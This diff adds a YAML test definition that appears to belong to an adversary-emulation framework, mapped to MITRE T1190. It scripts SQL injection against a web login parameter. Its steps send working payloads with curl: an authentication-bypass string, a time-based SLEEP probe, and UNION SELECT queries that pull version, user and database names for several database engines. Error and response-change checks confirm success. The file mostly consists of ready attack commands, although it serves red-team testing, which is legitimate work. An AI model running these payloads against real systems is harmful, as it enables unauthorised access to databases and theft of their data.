@@ -1,0 +1,108 @@
+name: "013: SQL injection test"
+description: "Conduct SQL injection attacks to extract sensitive data or bypass authentication"
+id: "f6g9c1h4-0e3d-6c8h-1f4g-7d5e0c3h8g9f"
+api_version: "2.0"
+platform: darwin
+tags:
+  - initial_access
+  - web_exploitation
+  - sql_injection
+  - database_attack
+actors: []
+mitre_attack:
+  tactics:
+    - initial_access
+  techniques:
+    - T1190
+procedure_examples: []
+arguments:
+  target_url:
+    description: "Target application URL with vulnerable parameter"
+    type: string
+    required: true
+    default: "http://vulnerable-app.local/login.php"
+  vulnerable_parameter:
+    description: "Parameter suspected to be vulnerable to SQL injection"
+    type: string
+    required: true
+    default: "username"
+  injection_payload:
+    description: "SQL injection payload to test"
+    type: string
+    required: true
+    default: "' OR '1'='1"
+  database_type:
+    description: "Target database type (mysql, mssql, postgresql, oracle)"
+    type: string
+    required: true
+    default: "mysql"
+steps:
+  - name: "Test basic SQL injection"
+    description: "Attempt basic SQL injection attack"
+    command: |
+      echo "[*] Testing basic SQL injection on parameter: ${vulnerable_parameter}"
+      payload="${injection_payload}"
+      encoded_payload=$(echo "${payload}" | jq -sRr @uri)
+      curl -s "${target_url}?${vulnerable_parameter}=${encoded_payload}" | head -50
+  - name: "Detect database type"
+    description: "Identify the backend database type through error messages"
+    command: |
+      echo "[*] Detecting database type: ${database_type}"
+      test_payload="' AND SLEEP(5)--"
+      encoded=$(echo "${test_payload}" | jq -sRr @uri)
+      time curl -s -m 10 "${target_url}?${vulnerable_parameter}=${encoded}" > /tmp/db_response.txt
+  - name: "Extract data via SQL injection"
+    description: "Attempt to extract sensitive data from the database"
+    command: |
+      echo "[*] Attempting data extraction via SQL injection"
+      case "${database_type}" in
+        mysql)
+          payload="' UNION SELECT VERSION(),USER(),DATABASE()--"
+          ;;
+        mssql)
+          payload="' UNION SELECT @@VERSION,SYSTEM_USER,DB_NAME()--"
+          ;;
+        postgresql)
+          payload="' UNION SELECT VERSION(),CURRENT_USER,CURRENT_DATABASE()--"
+          ;;
+        *)
+          payload="' OR '1'='1"
+          ;;
+      esac
+      encoded=$(echo "${payload}" | jq -sRr @uri)
+      curl -s "${target_url}?${vulnerable_parameter}=${encoded}" | grep -i "version\|user\|database\|mysql\|postgres" | head -10
+  - name: "Verify exploitation"
+    description: "Verify successful SQL injection"
+    command: |
+      echo "[*] Verifying SQL injection success"
+      curl -s "${target_url}?${vulnerable_parameter}=${injection_payload}" > /tmp/sql_injection_result.txt
+      wc -l /tmp/sql_injection_result.txt
+checks:
+  - name: "SQL error detection"
+    description: "Check for SQL error messages indicating injection success"
+    command: "curl -s \"${target_url}?${vulnerable_parameter}=${injection_payload}\" | grep -qi 'sql\\|syntax\\|database\\|query' && echo 'PASS' || echo 'FAIL'"
+  - name: "Response change detection"
+    description: "Verify that injection payload causes response change"
+    command: |
+      normal=$(curl -s "${target_url}?${vulnerable_parameter}=test" | wc -c)
+      injected=$(curl -s "${target_url}?${vulnerable_parameter}=${injection_payload}" | wc -c)
+      if [ "$normal" != "$injected" ]; then echo "PASS"; else echo "FAIL"; fi
+tests:
+  - name: "sql_injection_dry_run"
+    description: "Test SQL injection in dry run mode"
+    dry_run: true
+    command: |
+      echo "[TEST] SQL Injection Test (Dry Run)"
+      echo "[TEST] Target: ${target_url}"
+      echo "[TEST] Parameter: ${vulnerable_parameter}"
+      echo "[TEST] Payload: ${injection_payload}"
+      echo "[TEST] Database: ${database_type}"
+      echo "[TEST] Would attempt exploitation and data extraction"
+cleanup:
+  - name: "Remove SQL injection artifacts"
+    description: "Clean up temporary files from SQL injection testing"
+    command: |
+      echo "[*] Cleaning up SQL injection test artifacts"
+      rm -f /tmp/db_response.txt 2>/dev/null
+      rm -f /tmp/sql_injection_result.txt 2>/dev/null
+      echo "[+] Cleanup complete"
